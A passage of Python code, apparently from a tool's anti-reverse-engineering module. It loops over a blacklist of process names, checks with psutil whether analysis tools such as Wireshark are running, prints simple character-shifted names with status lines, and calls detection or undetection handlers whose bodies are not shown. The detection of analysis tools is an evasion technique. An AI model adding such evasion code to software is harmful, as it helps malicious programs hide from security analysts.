                if len(decrypted_text) < len(text) - 4:
                    decrypted_text += chr(ord(char) - 1)  #Decrypt all characters except the last 4
                else:
                    decrypted_text += char  #Keep the last 4 characters as-is
            return decrypted_text
        
        def is_process_running(process_name):
            process_list = psutil.process_iter(attrs=['name'])
            for process in process_list:
                try:
                    if process.info['name'] == process_name:
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass

            return False
        for process_name in blackListed[0:]:
            done = False
            original_name = process_name[0]  #Store the original name
            if original_name.endswith(".exe"):
                encrypted_name = encrypt(original_name[:-4]) + ".exe"  #Encrypt the name without ".exe" and add it back
            else:
                encrypted_name = encrypt(original_name)  #Encrypt the entire name
            if is_process_running(original_name):
                print(f"{red}|{white}{red}[{white}-{red}]{white} {encrypted_name:<30} {green}[{white}Checked{green}]{white} > {green}True{white} {red}|{white} {red}[{white}Detected{red}]{white} > {red}True{white}  {red}|{white}")
                time.sleep(2)
                Anti_reverse_detect()
            else:
                print(f"{green}|{white}{green}[{white}+{green}]{white} {encrypted_name:<30} {green}[{white}Checked{green}]{white} > {green}True{white} {green}|{white} {green}[{white}Detected{green}]{white} > {green}False{white} {green}|{white}")
                if original_name == "WiresharkLauncher.exe":
                    done = True
                    if done == True:
                        Anti_reverse_undetect()
                        done = False
    Anti_Reverse_start()
    """